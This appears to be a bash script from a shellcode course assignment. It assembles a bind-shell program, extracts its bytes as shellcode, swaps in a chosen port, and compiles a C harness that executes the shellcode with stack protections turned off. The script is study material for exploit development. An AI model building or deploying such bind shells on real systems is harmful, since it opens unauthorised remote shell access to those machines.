#!/bin/bash

# Author: Bas Lubbers
# Student ID: SLAE-1456
# Create bind_shell
# Assignment_01 - Shell_Bind_TCP
# Usage : ./compile_bind_shell.sh shell_bind_tcp 1337


port1=`printf %04X $2 |grep -o ..| tr -d '\n'`
port2=`echo \\\\\\\x${port1:0:2}\\\\\\\x${port1:2:4}`

echo "[*] Assembling $1 with Nasm"
nasm -f elf32 -o $1.o $1.nasm

echo "[*] Linking $1"
ld -o $1 $1.o

echo "[*] Swapping port in the shellcode"

shellcode=`objdump -d $1 | grep '[0-9a-f]:' | grep -v 'file' | cut -d ':' -f 2 | cut -f1-6 -d ' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/'`
shellcode_new=`echo $shellcode | sed 's/\\\\x05\\\\x39/'"$port2"'/g'`

echo "#include<stdio.h>" > shellcode.c
echo "#include<string.h>" >> shellcode.c
echo "unsigned char code[] = \\" >> shellcode.c
echo $shellcode_new";" >> shellcode.c
echo "main()" >> shellcode.c
echo "{" >> shellcode.c
echo "printf(\"Shellcode Length:  %d\n\", strlen(code));" >> shellcode.c
echo "  int (*ret)() = (int(*)())code;" >> shellcode.c
echo "	ret();" >> shellcode.c
echo "}" >> shellcode.c

echo "[*] Compiling shellcode.c"

gcc -w -z execstack -fno-stack-protector shellcode.c -o shellcode

echo "[*] Execute ./shellcode to run $1 on port $2"
